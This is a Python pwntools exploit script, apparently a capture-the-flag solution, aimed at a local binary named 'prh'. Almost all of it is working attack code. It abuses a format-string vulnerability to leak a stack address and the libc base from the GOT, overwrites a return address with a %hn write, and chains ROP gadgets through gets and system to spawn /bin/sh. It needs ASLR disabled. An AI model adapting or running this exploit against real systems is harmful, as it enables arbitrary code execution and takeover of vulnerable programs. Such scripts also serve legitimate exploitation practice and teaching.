#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./prh')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

'''
Disable ASLR first !
'''

e = ELF('./prh')

libc_start_main_got = e.got['__libc_start_main'] 

#r.sendline('%c'*16 + '%57992c' + '%hn%239c%20$hhn')
#r.sendline('%c'*16 + '%57992c' + '%hn%240c%20$hhn')

r.sendline('%c'*16 + '%57992c' + '%hn%240c%20$hhn' + '@@%18$lx@@' + '#%15$s##' + p64(libc_start_main_got))

r.recvuntil('@')
x = r.recv()
stack = int('0x' + re.findall('@(.*)@@', x)[0],16)
print hex(stack)

libc_base = u64((re.findall('#(.*)##', x)[0]).ljust(8,'\x00')) - libc.symbols['__libc_start_main']
print hex(libc_base)

gets_addr = libc_base + libc.symbols['gets']
system_addr = libc_base + libc.symbols['system']

retstack = stack - 216
print hex(retstack)
pop3_ret = 0x40076e # 0x76e = 1902
pop_rdi_ret = 0x400773

rop = flat(
    pop_rdi_ret, stack, gets_addr,
    pop_rdi_ret, stack, system_addr
)

r.sendline('%1902c%8$hn'.ljust(16) + p64(retstack) + rop)

raw_input('#')
r.sendline('/bin//sh')


r.interactive()
